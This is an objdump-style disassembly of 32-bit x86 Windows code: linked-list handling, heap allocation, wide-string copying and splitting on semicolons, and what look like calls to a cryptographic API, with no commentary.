  402a46:	8b 44 24 24          	mov    0x24(%esp),%eax
  402a4a:	3b 38                	cmp    (%eax),%edi
  402a4c:	74 11                	je     0x402a5f
  402a4e:	e8 7d 3b 00 00       	call   0x4065d0
  402a53:	33 c0                	xor    %eax,%eax
  402a55:	5f                   	pop    %edi
  402a56:	5e                   	pop    %esi
  402a57:	5d                   	pop    %ebp
  402a58:	5b                   	pop    %ebx
  402a59:	83 c4 0c             	add    $0xc,%esp
  402a5c:	c2 08 00             	ret    $0x8
  402a5f:	0f b7 4c 24 16       	movzwl 0x16(%esp),%ecx
  402a64:	89 08                	mov    %ecx,(%eax)
  402a66:	8b 46 04             	mov    0x4(%esi),%eax
  402a69:	85 c0                	test   %eax,%eax
  402a6b:	74 34                	je     0x402aa1
  402a6d:	50                   	push   %eax
  402a6e:	ff 15 24 80 40 00    	call   *0x408024
  402a74:	85 c0                	test   %eax,%eax
  402a76:	75 22                	jne    0x402a9a
  402a78:	ff 15 04 81 40 00    	call   *0x408104
  402a7e:	50                   	push   %eax
  402a7f:	e8 4c 3b 00 00       	call   0x4065d0
  402a84:	83 c4 04             	add    $0x4,%esp
  402a87:	55                   	push   %ebp
  402a88:	ff 15 3c 81 40 00    	call   *0x40813c
  402a8e:	8b c3                	mov    %ebx,%eax
  402a90:	5f                   	pop    %edi
  402a91:	5e                   	pop    %esi
  402a92:	5d                   	pop    %ebp
  402a93:	5b                   	pop    %ebx
  402a94:	83 c4 0c             	add    $0xc,%esp
  402a97:	c2 08 00             	ret    $0x8
  402a9a:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  402aa1:	55                   	push   %ebp
  402aa2:	ff 15 3c 81 40 00    	call   *0x40813c
  402aa8:	5f                   	pop    %edi
  402aa9:	5e                   	pop    %esi
  402aaa:	5d                   	pop    %ebp
  402aab:	8b c3                	mov    %ebx,%eax
  402aad:	5b                   	pop    %ebx
  402aae:	83 c4 0c             	add    $0xc,%esp
  402ab1:	c2 08 00             	ret    $0x8
  402ab4:	cc                   	int3
  402ab5:	cc                   	int3
  402ab6:	cc                   	int3
  402ab7:	cc                   	int3
  402ab8:	cc                   	int3
  402ab9:	cc                   	int3
  402aba:	cc                   	int3
  402abb:	cc                   	int3
  402abc:	cc                   	int3
  402abd:	cc                   	int3
  402abe:	cc                   	int3
  402abf:	cc                   	int3
  402ac0:	56                   	push   %esi
  402ac1:	8b 35 80 b2 41 00    	mov    0x41b280,%esi
  402ac7:	83 3e 00             	cmpl   $0x0,(%esi)
  402aca:	75 1e                	jne    0x402aea
  402acc:	68 00 00 00 f0       	push   $0xf0000000
  402ad1:	6a 18                	push   $0x18
  402ad3:	6a 00                	push   $0x0
  402ad5:	6a 00                	push   $0x0
  402ad7:	56                   	push   %esi
  402ad8:	ff 15 28 80 40 00    	call   *0x408028
  402ade:	85 c0                	test   %eax,%eax
  402ae0:	75 08                	jne    0x402aea
  402ae2:	89 06                	mov    %eax,(%esi)
  402ae4:	32 c0                	xor    %al,%al
  402ae6:	5e                   	pop    %esi
  402ae7:	c2 08 00             	ret    $0x8
  402aea:	8b 44 24 08          	mov    0x8(%esp),%eax
  402aee:	8b 0e                	mov    (%esi),%ecx
  402af0:	57                   	push   %edi
  402af1:	6a 00                	push   $0x0
  402af3:	6a 00                	push   $0x0
  402af5:	6a 2c                	push   $0x2c
  402af7:	50                   	push   %eax
  402af8:	51                   	push   %ecx
  402af9:	ff 15 34 80 40 00    	call   *0x408034
  402aff:	85 c0                	test   %eax,%eax
  402b01:	75 0c                	jne    0x402b0f
  402b03:	ff 15 04 81 40 00    	call   *0x408104
  402b09:	32 c0                	xor    %al,%al
  402b0b:	5e                   	pop    %esi
  402b0c:	c2 08 00             	ret    $0x8
  402b0f:	8b 54 24 0c          	mov    0xc(%esp),%edx
  402b13:	8b 07                	mov    (%edi),%eax
  402b15:	6a 00                	push   $0x0
  402b17:	52                   	push   %edx
  402b18:	6a 01                	push   $0x1
  402b1a:	50                   	push   %eax
  402b1b:	ff 15 2c 80 40 00    	call   *0x40802c
  402b21:	85 c0                	test   %eax,%eax
  402b23:	74 de                	je     0x402b03
  402b25:	b0 01                	mov    $0x1,%al
  402b27:	5e                   	pop    %esi
  402b28:	c2 08 00             	ret    $0x8
  402b2b:	cc                   	int3
  402b2c:	cc                   	int3
  402b2d:	cc                   	int3
  402b2e:	cc                   	int3
  402b2f:	cc                   	int3
  402b30:	51                   	push   %ecx
  402b31:	50                   	push   %eax
  402b32:	89 44 24 04          	mov    %eax,0x4(%esp)
  402b36:	8d 44 24 04          	lea    0x4(%esp),%eax
  402b3a:	50                   	push   %eax
  402b3b:	51                   	push   %ecx
  402b3c:	6a 00                	push   $0x0
  402b3e:	6a 00                	push   $0x0
  402b40:	6a 00                	push   $0x0
  402b42:	52                   	push   %edx
  402b43:	ff 15 38 80 40 00    	call   *0x408038
  402b49:	59                   	pop    %ecx
  402b4a:	c3                   	ret
  402b4b:	cc                   	int3
  402b4c:	cc                   	int3
  402b4d:	cc                   	int3
  402b4e:	cc                   	int3
  402b4f:	cc                   	int3
  402b50:	8b 44 24 04          	mov    0x4(%esp),%eax
  402b54:	53                   	push   %ebx
  402b55:	8b 1d 8c 80 40 00    	mov    0x40808c,%ebx
  402b5b:	55                   	push   %ebp
  402b5c:	8b 2d 90 80 40 00    	mov    0x408090,%ebp
  402b62:	56                   	push   %esi
  402b63:	8b 70 34             	mov    0x34(%eax),%esi
  402b66:	85 f6                	test   %esi,%esi
  402b68:	57                   	push   %edi
  402b69:	8b 3d 34 81 40 00    	mov    0x408134,%edi
  402b6f:	74 48                	je     0x402bb9
  402b71:	66 83 be 16 00 01 00 	cmpw   $0x0,0x10016(%esi)
  402b78:	00 
  402b79:	8b 8e 34 00 01 00    	mov    0x10034(%esi),%ecx
  402b7f:	8b 96 38 00 01 00    	mov    0x10038(%esi),%edx
  402b85:	8d 86 16 00 01 00    	lea    0x10016(%esi),%eax
  402b8b:	51                   	push   %ecx
  402b8c:	52                   	push   %edx
  402b8d:	74 0a                	je     0x402b99
  402b8f:	e8 3c 3a 00 00       	call   0x4065d0
  402b94:	83 c4 08             	add    $0x8,%esp
  402b97:	eb 09                	jmp    0x402ba2
  402b99:	50                   	push   %eax
  402b9a:	e8 31 3a 00 00       	call   0x4065d0
  402b9f:	83 c4 0c             	add    $0xc,%esp
  402ba2:	56                   	push   %esi
  402ba3:	ff d7                	call   *%edi
  402ba5:	8b c6                	mov    %esi,%eax
  402ba7:	8b b6 50 00 01 00    	mov    0x10050(%esi),%esi
  402bad:	50                   	push   %eax
  402bae:	6a 00                	push   $0x0
  402bb0:	ff d5                	call   *%ebp
  402bb2:	50                   	push   %eax
  402bb3:	ff d3                	call   *%ebx
  402bb5:	85 f6                	test   %esi,%esi
  402bb7:	75 b8                	jne    0x402b71
  402bb9:	8b 44 24 14          	mov    0x14(%esp),%eax
  402bbd:	83 c0 18             	add    $0x18,%eax
  402bc0:	50                   	push   %eax
  402bc1:	ff d7                	call   *%edi
  402bc3:	8b 74 24 14          	mov    0x14(%esp),%esi
  402bc7:	56                   	push   %esi
  402bc8:	ff d7                	call   *%edi
  402bca:	8b 46 38             	mov    0x38(%esi),%eax
  402bcd:	85 c0                	test   %eax,%eax
  402bcf:	74 08                	je     0x402bd9
  402bd1:	50                   	push   %eax
  402bd2:	6a 00                	push   $0x0
  402bd4:	ff d5                	call   *%ebp
  402bd6:	50                   	push   %eax
  402bd7:	ff d3                	call   *%ebx
  402bd9:	8b 76 3c             	mov    0x3c(%esi),%esi
  402bdc:	85 f6                	test   %esi,%esi
  402bde:	74 08                	je     0x402be8
  402be0:	56                   	push   %esi
  402be1:	6a 00                	push   $0x0
  402be3:	ff d5                	call   *%ebp
  402be5:	50                   	push   %eax
  402be6:	ff d3                	call   *%ebx
  402be8:	5f                   	pop    %edi
  402be9:	5e                   	pop    %esi
  402bea:	5d                   	pop    %ebp
  402beb:	5b                   	pop    %ebx
  402bec:	c2 04 00             	ret    $0x4
  402bef:	cc                   	int3
  402bf0:	53                   	push   %ebx
  402bf1:	55                   	push   %ebp
  402bf2:	8b 6c 24 0c          	mov    0xc(%esp),%ebp
  402bf6:	8d 45 18             	lea    0x18(%ebp),%eax
  402bf9:	56                   	push   %esi
  402bfa:	50                   	push   %eax
  402bfb:	89 44 24 14          	mov    %eax,0x14(%esp)
  402bff:	ff 15 44 81 40 00    	call   *0x408144
  402c05:	8b 75 34             	mov    0x34(%ebp),%esi
  402c08:	33 db                	xor    %ebx,%ebx
  402c0a:	3b f3                	cmp    %ebx,%esi
  402c0c:	74 21                	je     0x402c2f
  402c0e:	8b ff                	mov    %edi,%edi
  402c10:	8d 96 16 00 01 00    	lea    0x10016(%esi),%edx
  402c16:	8b c7                	mov    %edi,%eax
  402c18:	e8 d3 13 00 00       	call   0x403ff0
  402c1d:	85 c0                	test   %eax,%eax
  402c1f:	0f 84 9e 00 00 00    	je     0x402cc3
  402c25:	8b b6 50 00 01 00    	mov    0x10050(%esi),%esi
  402c2b:	3b f3                	cmp    %ebx,%esi
  402c2d:	75 e1                	jne    0x402c10
  402c2f:	68 58 00 01 00       	push   $0x10058
  402c34:	53                   	push   %ebx
  402c35:	ff 15 90 80 40 00    	call   *0x408090
  402c3b:	50                   	push   %eax
  402c3c:	ff 15 84 80 40 00    	call   *0x408084
  402c42:	8b f0                	mov    %eax,%esi
  402c44:	56                   	push   %esi
  402c45:	ff 15 40 81 40 00    	call   *0x408140
  402c4b:	6a 10                	push   $0x10
  402c4d:	8d 8e 16 00 01 00    	lea    0x10016(%esi),%ecx
  402c53:	57                   	push   %edi
  402c54:	51                   	push   %ecx
  402c55:	e8 e6 e4 ff ff       	call   0x401140
  402c5a:	66 89 5e 18          	mov    %bx,0x18(%esi)
  402c5e:	8b 57 18             	mov    0x18(%edi),%edx
  402c61:	89 96 28 00 01 00    	mov    %edx,0x10028(%esi)
  402c67:	8b 47 1c             	mov    0x1c(%edi),%eax
  402c6a:	89 86 30 00 01 00    	mov    %eax,0x10030(%esi)
  402c70:	8b 4f 14             	mov    0x14(%edi),%ecx
  402c73:	89 8e 2c 00 01 00    	mov    %ecx,0x1002c(%esi)
  402c79:	89 9e 34 00 01 00    	mov    %ebx,0x10034(%esi)
  402c7f:	89 9e 38 00 01 00    	mov    %ebx,0x10038(%esi)
  402c85:	89 9e 48 00 01 00    	mov    %ebx,0x10048(%esi)
  402c8b:	89 9e 4c 00 01 00    	mov    %ebx,0x1004c(%esi)
  402c91:	89 9e 40 00 01 00    	mov    %ebx,0x10040(%esi)
  402c97:	89 9e 44 00 01 00    	mov    %ebx,0x10044(%esi)
  402c9d:	89 9e 50 00 01 00    	mov    %ebx,0x10050(%esi)
  402ca3:	8b 45 34             	mov    0x34(%ebp),%eax
  402ca6:	83 c4 0c             	add    $0xc,%esp
  402ca9:	3b c3                	cmp    %ebx,%eax
  402cab:	75 29                	jne    0x402cd6
  402cad:	8b 54 24 10          	mov    0x10(%esp),%edx
  402cb1:	52                   	push   %edx
  402cb2:	89 75 34             	mov    %esi,0x34(%ebp)
  402cb5:	ff 15 3c 81 40 00    	call   *0x40813c
  402cbb:	8b c6                	mov    %esi,%eax
  402cbd:	5e                   	pop    %esi
  402cbe:	5d                   	pop    %ebp
  402cbf:	5b                   	pop    %ebx
  402cc0:	c2 04 00             	ret    $0x4
  402cc3:	8b 44 24 10          	mov    0x10(%esp),%eax
  402cc7:	50                   	push   %eax
  402cc8:	ff 15 3c 81 40 00    	call   *0x40813c
  402cce:	8b c6                	mov    %esi,%eax
  402cd0:	5e                   	pop    %esi
  402cd1:	5d                   	pop    %ebp
  402cd2:	5b                   	pop    %ebx
  402cd3:	c2 04 00             	ret    $0x4
  402cd6:	39 98 50 00 01 00    	cmp    %ebx,0x10050(%eax)
  402cdc:	74 10                	je     0x402cee
  402cde:	8b ff                	mov    %edi,%edi
  402ce0:	8b 80 50 00 01 00    	mov    0x10050(%eax),%eax
  402ce6:	39 98 50 00 01 00    	cmp    %ebx,0x10050(%eax)
  402cec:	75 f2                	jne    0x402ce0
  402cee:	8b 54 24 10          	mov    0x10(%esp),%edx
  402cf2:	52                   	push   %edx
  402cf3:	89 b0 50 00 01 00    	mov    %esi,0x10050(%eax)
  402cf9:	ff 15 3c 81 40 00    	call   *0x40813c
  402cff:	8b c6                	mov    %esi,%eax
  402d01:	5e                   	pop    %esi
  402d02:	5d                   	pop    %ebp
  402d03:	5b                   	pop    %ebx
  402d04:	c2 04 00             	ret    $0x4
  402d07:	cc                   	int3
  402d08:	cc                   	int3
  402d09:	cc                   	int3
  402d0a:	cc                   	int3
  402d0b:	cc                   	int3
  402d0c:	cc                   	int3
  402d0d:	cc                   	int3
  402d0e:	cc                   	int3
  402d0f:	cc                   	int3
  402d10:	53                   	push   %ebx
  402d11:	8b 58 34             	mov    0x34(%eax),%ebx
  402d14:	85 db                	test   %ebx,%ebx
  402d16:	55                   	push   %ebp
  402d17:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  402d1b:	56                   	push   %esi
  402d1c:	8b f1                	mov    %ecx,%esi
  402d1e:	74 47                	je     0x402d67
  402d20:	57                   	push   %edi
  402d21:	eb 0d                	jmp    0x402d30
  402d23:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  402d2a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  402d30:	66 83 bb 16 00 01 00 	cmpw   $0x0,0x10016(%ebx)
  402d37:	00 
  402d38:	8d 8b 16 00 01 00    	lea    0x10016(%ebx),%ecx
  402d3e:	74 1c                	je     0x402d5c
  402d40:	83 bb 38 00 01 00 00 	cmpl   $0x0,0x10038(%ebx)
  402d47:	76 13                	jbe    0x402d5c
  402d49:	8b 54 24 18          	mov    0x18(%esp),%edx
  402d4d:	8b 7c 24 14          	mov    0x14(%esp),%edi
  402d51:	52                   	push   %edx
  402d52:	8b c5                	mov    %ebp,%eax
  402d54:	e8 17 49 00 00       	call   0x407670
  402d59:	83 c4 04             	add    $0x4,%esp
  402d5c:	8b 9b 50 00 01 00    	mov    0x10050(%ebx),%ebx
  402d62:	85 db                	test   %ebx,%ebx
  402d64:	75 ca                	jne    0x402d30
  402d66:	5f                   	pop    %edi
  402d67:	5e                   	pop    %esi
  402d68:	5d                   	pop    %ebp
  402d69:	5b                   	pop    %ebx
  402d6a:	c2 0c 00             	ret    $0xc
  402d6d:	cc                   	int3
  402d6e:	cc                   	int3
  402d6f:	cc                   	int3
  402d70:	8b 49 34             	mov    0x34(%ecx),%ecx
  402d73:	33 c0                	xor    %eax,%eax
  402d75:	33 d2                	xor    %edx,%edx
  402d77:	85 c9                	test   %ecx,%ecx
  402d79:	56                   	push   %esi
  402d7a:	74 1e                	je     0x402d9a
  402d7c:	8d 64 24 00          	lea    0x0(%esp),%esp
  402d80:	8b b1 48 00 01 00    	mov    0x10048(%ecx),%esi
  402d86:	03 c6                	add    %esi,%eax
  402d88:	8b b1 4c 00 01 00    	mov    0x1004c(%ecx),%esi
  402d8e:	8b 89 50 00 01 00    	mov    0x10050(%ecx),%ecx
  402d94:	13 d6                	adc    %esi,%edx
  402d96:	85 c9                	test   %ecx,%ecx
  402d98:	75 e6                	jne    0x402d80
  402d9a:	5e                   	pop    %esi
  402d9b:	c3                   	ret
  402d9c:	cc                   	int3
  402d9d:	cc                   	int3
  402d9e:	cc                   	int3
  402d9f:	cc                   	int3
  402da0:	8b 44 24 04          	mov    0x4(%esp),%eax
  402da4:	55                   	push   %ebp
  402da5:	8b 2d 8c 80 40 00    	mov    0x40808c,%ebp
  402dab:	56                   	push   %esi
  402dac:	8b 30                	mov    (%eax),%esi
  402dae:	85 f6                	test   %esi,%esi
  402db0:	74 31                	je     0x402de3
  402db2:	53                   	push   %ebx
  402db3:	57                   	push   %edi
  402db4:	8b de                	mov    %esi,%ebx
  402db6:	8b 3b                	mov    (%ebx),%edi
  402db8:	85 ff                	test   %edi,%edi
  402dba:	8b 76 04             	mov    0x4(%esi),%esi
  402dbd:	74 12                	je     0x402dd1
  402dbf:	57                   	push   %edi
  402dc0:	e8 8b fd ff ff       	call   0x402b50
  402dc5:	57                   	push   %edi
  402dc6:	6a 00                	push   $0x0
  402dc8:	ff 15 90 80 40 00    	call   *0x408090
  402dce:	50                   	push   %eax
  402dcf:	ff d5                	call   *%ebp
  402dd1:	53                   	push   %ebx
  402dd2:	6a 00                	push   $0x0
  402dd4:	ff 15 90 80 40 00    	call   *0x408090
  402dda:	50                   	push   %eax
  402ddb:	ff d5                	call   *%ebp
  402ddd:	85 f6                	test   %esi,%esi
  402ddf:	75 d3                	jne    0x402db4
  402de1:	5f                   	pop    %edi
  402de2:	5b                   	pop    %ebx
  402de3:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  402de7:	8b 41 04             	mov    0x4(%ecx),%eax
  402dea:	85 c0                	test   %eax,%eax
  402dec:	8b 35 90 80 40 00    	mov    0x408090,%esi
  402df2:	74 08                	je     0x402dfc
  402df4:	50                   	push   %eax
  402df5:	6a 00                	push   $0x0
  402df7:	ff d6                	call   *%esi
  402df9:	50                   	push   %eax
  402dfa:	ff d5                	call   *%ebp
  402dfc:	8b 54 24 0c          	mov    0xc(%esp),%edx
  402e00:	8b 42 08             	mov    0x8(%edx),%eax
  402e03:	85 c0                	test   %eax,%eax
  402e05:	74 08                	je     0x402e0f
  402e07:	50                   	push   %eax
  402e08:	6a 00                	push   $0x0
  402e0a:	ff d6                	call   *%esi
  402e0c:	50                   	push   %eax
  402e0d:	ff d5                	call   *%ebp
  402e0f:	8b 44 24 0c          	mov    0xc(%esp),%eax
  402e13:	8b 40 0c             	mov    0xc(%eax),%eax
  402e16:	85 c0                	test   %eax,%eax
  402e18:	74 08                	je     0x402e22
  402e1a:	50                   	push   %eax
  402e1b:	6a 00                	push   $0x0
  402e1d:	ff d6                	call   *%esi
  402e1f:	50                   	push   %eax
  402e20:	ff d5                	call   *%ebp
  402e22:	5e                   	pop    %esi
  402e23:	5d                   	pop    %ebp
  402e24:	c2 04 00             	ret    $0x4
  402e27:	cc                   	int3
  402e28:	cc                   	int3
  402e29:	cc                   	int3
  402e2a:	cc                   	int3
  402e2b:	cc                   	int3
  402e2c:	cc                   	int3
  402e2d:	cc                   	int3
  402e2e:	cc                   	int3
  402e2f:	cc                   	int3
  402e30:	51                   	push   %ecx
  402e31:	53                   	push   %ebx
  402e32:	55                   	push   %ebp
  402e33:	8b 2d 50 b2 41 00    	mov    0x41b250,%ebp
  402e39:	56                   	push   %esi
  402e3a:	8b 35 90 80 40 00    	mov    0x408090,%esi
  402e40:	57                   	push   %edi
  402e41:	6a 08                	push   $0x8
  402e43:	6a 00                	push   $0x0
  402e45:	ff d6                	call   *%esi
  402e47:	8b 1d 84 80 40 00    	mov    0x408084,%ebx
  402e4d:	50                   	push   %eax
  402e4e:	ff d3                	call   *%ebx
  402e50:	6a 40                	push   $0x40
  402e52:	8b f8                	mov    %eax,%edi
  402e54:	6a 00                	push   $0x0
  402e56:	c7 47 04 00 00 00 00 	movl   $0x0,0x4(%edi)
  402e5d:	ff d6                	call   *%esi
  402e5f:	50                   	push   %eax
  402e60:	ff d3                	call   *%ebx
  402e62:	8b f0                	mov    %eax,%esi
  402e64:	33 c0                	xor    %eax,%eax
  402e66:	3b f0                	cmp    %eax,%esi
  402e68:	74 3f                	je     0x402ea9
  402e6a:	8b 1d 40 81 40 00    	mov    0x408140,%ebx
  402e70:	56                   	push   %esi
  402e71:	89 46 30             	mov    %eax,0x30(%esi)
  402e74:	89 46 34             	mov    %eax,0x34(%esi)
  402e77:	ff d3                	call   *%ebx
  402e79:	8d 46 18             	lea    0x18(%esi),%eax
  402e7c:	50                   	push   %eax
  402e7d:	ff d3                	call   *%ebx
  402e7f:	a1 80 b2 41 00       	mov    0x41b280,%eax
  402e84:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  402e88:	51                   	push   %ecx
  402e89:	6a 23                	push   $0x23
  402e8b:	e8 c0 fa ff ff       	call   0x402950
  402e90:	8d 54 24 10          	lea    0x10(%esp),%edx
  402e94:	52                   	push   %edx
  402e95:	89 46 38             	mov    %eax,0x38(%esi)
  402e98:	a1 80 b2 41 00       	mov    0x41b280,%eax
  402e9d:	6a 24                	push   $0x24
  402e9f:	e8 ac fa ff ff       	call   0x402950
  402ea4:	89 46 3c             	mov    %eax,0x3c(%esi)
  402ea7:	eb 02                	jmp    0x402eab
  402ea9:	33 f6                	xor    %esi,%esi
  402eab:	89 37                	mov    %esi,(%edi)
  402ead:	8b 45 00             	mov    0x0(%ebp),%eax
  402eb0:	85 c0                	test   %eax,%eax
  402eb2:	75 09                	jne    0x402ebd
  402eb4:	89 7d 00             	mov    %edi,0x0(%ebp)
  402eb7:	5f                   	pop    %edi
  402eb8:	5e                   	pop    %esi
  402eb9:	5d                   	pop    %ebp
  402eba:	5b                   	pop    %ebx
  402ebb:	59                   	pop    %ecx
  402ebc:	c3                   	ret
  402ebd:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  402ec1:	74 09                	je     0x402ecc
  402ec3:	8b 40 04             	mov    0x4(%eax),%eax
  402ec6:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  402eca:	75 f7                	jne    0x402ec3
  402ecc:	89 78 04             	mov    %edi,0x4(%eax)
  402ecf:	5f                   	pop    %edi
  402ed0:	5e                   	pop    %esi
  402ed1:	5d                   	pop    %ebp
  402ed2:	5b                   	pop    %ebx
  402ed3:	59                   	pop    %ecx
  402ed4:	c3                   	ret
  402ed5:	cc                   	int3
  402ed6:	cc                   	int3
  402ed7:	cc                   	int3
  402ed8:	cc                   	int3
  402ed9:	cc                   	int3
  402eda:	cc                   	int3
  402edb:	cc                   	int3
  402edc:	cc                   	int3
  402edd:	cc                   	int3
  402ede:	cc                   	int3
  402edf:	cc                   	int3
  402ee0:	a1 50 b2 41 00       	mov    0x41b250,%eax
  402ee5:	8b 08                	mov    (%eax),%ecx
  402ee7:	85 c9                	test   %ecx,%ecx
  402ee9:	75 03                	jne    0x402eee
  402eeb:	33 c0                	xor    %eax,%eax
  402eed:	c3                   	ret
  402eee:	8b 41 04             	mov    0x4(%ecx),%eax
  402ef1:	85 c0                	test   %eax,%eax
  402ef3:	74 09                	je     0x402efe
  402ef5:	8b c8                	mov    %eax,%ecx
  402ef7:	8b 41 04             	mov    0x4(%ecx),%eax
  402efa:	85 c0                	test   %eax,%eax
  402efc:	75 f7                	jne    0x402ef5
  402efe:	8b 01                	mov    (%ecx),%eax
  402f00:	c3                   	ret
  402f01:	cc                   	int3
  402f02:	cc                   	int3
  402f03:	cc                   	int3
  402f04:	cc                   	int3
  402f05:	cc                   	int3
  402f06:	cc                   	int3
  402f07:	cc                   	int3
  402f08:	cc                   	int3
  402f09:	cc                   	int3
  402f0a:	cc                   	int3
  402f0b:	cc                   	int3
  402f0c:	cc                   	int3
  402f0d:	cc                   	int3
  402f0e:	cc                   	int3
  402f0f:	cc                   	int3
  402f10:	56                   	push   %esi
  402f11:	8b 30                	mov    (%eax),%esi
  402f13:	85 f6                	test   %esi,%esi
  402f15:	74 2d                	je     0x402f44
  402f17:	53                   	push   %ebx
  402f18:	8b 1d 8c 80 40 00    	mov    0x40808c,%ebx
  402f1e:	55                   	push   %ebp
  402f1f:	8b 2d 90 80 40 00    	mov    0x408090,%ebp
  402f25:	57                   	push   %edi
  402f26:	8b fe                	mov    %esi,%edi
  402f28:	8b 07                	mov    (%edi),%eax
  402f2a:	8b 76 04             	mov    0x4(%esi),%esi
  402f2d:	50                   	push   %eax
  402f2e:	6a 00                	push   $0x0
  402f30:	ff d5                	call   *%ebp
  402f32:	50                   	push   %eax
  402f33:	ff d3                	call   *%ebx
  402f35:	57                   	push   %edi
  402f36:	6a 00                	push   $0x0
  402f38:	ff d5                	call   *%ebp
  402f3a:	50                   	push   %eax
  402f3b:	ff d3                	call   *%ebx
  402f3d:	85 f6                	test   %esi,%esi
  402f3f:	75 e5                	jne    0x402f26
  402f41:	5f                   	pop    %edi
  402f42:	5d                   	pop    %ebp
  402f43:	5b                   	pop    %ebx
  402f44:	5e                   	pop    %esi
  402f45:	c3                   	ret
  402f46:	cc                   	int3
  402f47:	cc                   	int3
  402f48:	cc                   	int3
  402f49:	cc                   	int3
  402f4a:	cc                   	int3
  402f4b:	cc                   	int3
  402f4c:	cc                   	int3
  402f4d:	cc                   	int3
  402f4e:	cc                   	int3
  402f4f:	cc                   	int3
  402f50:	53                   	push   %ebx
  402f51:	55                   	push   %ebp
  402f52:	56                   	push   %esi
  402f53:	57                   	push   %edi
  402f54:	8b 3d 90 80 40 00    	mov    0x408090,%edi
  402f5a:	6a 08                	push   $0x8
  402f5c:	6a 00                	push   $0x0
  402f5e:	8b f0                	mov    %eax,%esi
  402f60:	ff d7                	call   *%edi
  402f62:	8b 1d 84 80 40 00    	mov    0x408084,%ebx
  402f68:	50                   	push   %eax
  402f69:	ff d3                	call   *%ebx
  402f6b:	8b e8                	mov    %eax,%ebp
  402f6d:	c7 45 04 00 00 00 00 	movl   $0x0,0x4(%ebp)
  402f74:	8b c6                	mov    %esi,%eax
  402f76:	66 8b 08             	mov    (%eax),%cx
  402f79:	83 c0 02             	add    $0x2,%eax
  402f7c:	66 85 c9             	test   %cx,%cx
  402f7f:	75 f5                	jne    0x402f76
  402f81:	2b c6                	sub    %esi,%eax
  402f83:	d1 f8                	sar    $1,%eax
  402f85:	03 c0                	add    %eax,%eax
  402f87:	74 0a                	je     0x402f93
  402f89:	50                   	push   %eax
  402f8a:	6a 00                	push   $0x0
  402f8c:	ff d7                	call   *%edi
  402f8e:	50                   	push   %eax
  402f8f:	ff d3                	call   *%ebx
  402f91:	eb 02                	jmp    0x402f95
  402f93:	33 c0                	xor    %eax,%eax
  402f95:	89 45 00             	mov    %eax,0x0(%ebp)
  402f98:	8b ce                	mov    %esi,%ecx
  402f9a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  402fa0:	66 8b 11             	mov    (%ecx),%dx
  402fa3:	83 c1 02             	add    $0x2,%ecx
  402fa6:	66 85 d2             	test   %dx,%dx
  402fa9:	75 f5                	jne    0x402fa0
  402fab:	2b ce                	sub    %esi,%ecx
  402fad:	d1 f9                	sar    $1,%ecx
  402faf:	8b f8                	mov    %eax,%edi
  402fb1:	8b d6                	mov    %esi,%edx
  402fb3:	8b d9                	mov    %ecx,%ebx
  402fb5:	2b fe                	sub    %esi,%edi
  402fb7:	eb 07                	jmp    0x402fc0
  402fb9:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  402fc0:	0f b7 32             	movzwl (%edx),%esi
  402fc3:	66 89 34 17          	mov    %si,(%edi,%edx,1)
  402fc7:	83 c2 02             	add    $0x2,%edx
  402fca:	66 85 f6             	test   %si,%si
  402fcd:	74 05                	je     0x402fd4
  402fcf:	83 eb 01             	sub    $0x1,%ebx
  402fd2:	75 ec                	jne    0x402fc0
  402fd4:	85 db                	test   %ebx,%ebx
  402fd6:	75 05                	jne    0x402fdd
  402fd8:	66 89 5c 48 fe       	mov    %bx,-0x2(%eax,%ecx,2)
  402fdd:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  402fe1:	8b 01                	mov    (%ecx),%eax
  402fe3:	85 c0                	test   %eax,%eax
  402fe5:	75 09                	jne    0x402ff0
  402fe7:	5f                   	pop    %edi
  402fe8:	5e                   	pop    %esi
  402fe9:	89 29                	mov    %ebp,(%ecx)
  402feb:	5d                   	pop    %ebp
  402fec:	5b                   	pop    %ebx
  402fed:	c2 04 00             	ret    $0x4
  402ff0:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  402ff4:	74 09                	je     0x402fff
  402ff6:	8b 40 04             	mov    0x4(%eax),%eax
  402ff9:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  402ffd:	75 f7                	jne    0x402ff6
  402fff:	5f                   	pop    %edi
  403000:	5e                   	pop    %esi
  403001:	89 68 04             	mov    %ebp,0x4(%eax)
  403004:	5d                   	pop    %ebp
  403005:	5b                   	pop    %ebx
  403006:	c2 04 00             	ret    $0x4
  403009:	cc                   	int3
  40300a:	cc                   	int3
  40300b:	cc                   	int3
  40300c:	cc                   	int3
  40300d:	cc                   	int3
  40300e:	cc                   	int3
  40300f:	cc                   	int3
  403010:	56                   	push   %esi
  403011:	8b f0                	mov    %eax,%esi
  403013:	66 83 3e 00          	cmpw   $0x0,(%esi)
  403017:	74 4f                	je     0x403068
  403019:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  403020:	66 83 38 3b          	cmpw   $0x3b,(%eax)
  403024:	75 05                	jne    0x40302b
  403026:	66 c7 00 00 00       	movw   $0x0,(%eax)
  40302b:	83 c0 02             	add    $0x2,%eax
  40302e:	66 83 38 00          	cmpw   $0x0,(%eax)
  403032:	75 ec                	jne    0x403020
  403034:	66 83 3e 00          	cmpw   $0x0,(%esi)
  403038:	74 2e                	je     0x403068
  40303a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  403040:	57                   	push   %edi
  403041:	8b c6                	mov    %esi,%eax
  403043:	e8 08 ff ff ff       	call   0x402f50
  403048:	8b c6                	mov    %esi,%eax
  40304a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  403050:	66 8b 08             	mov    (%eax),%cx
  403053:	83 c0 02             	add    $0x2,%eax
  403056:	66 85 c9             	test   %cx,%cx
  403059:	75 f5                	jne    0x403050
  40305b:	2b c6                	sub    %esi,%eax
  40305d:	d1 f8                	sar    $1,%eax
  40305f:	66 39 0c 46          	cmp    %cx,(%esi,%eax,2)
  403063:	8d 34 46             	lea    (%esi,%eax,2),%esi
  403066:	75 d8                	jne    0x403040
  403068:	5e                   	pop    %esi
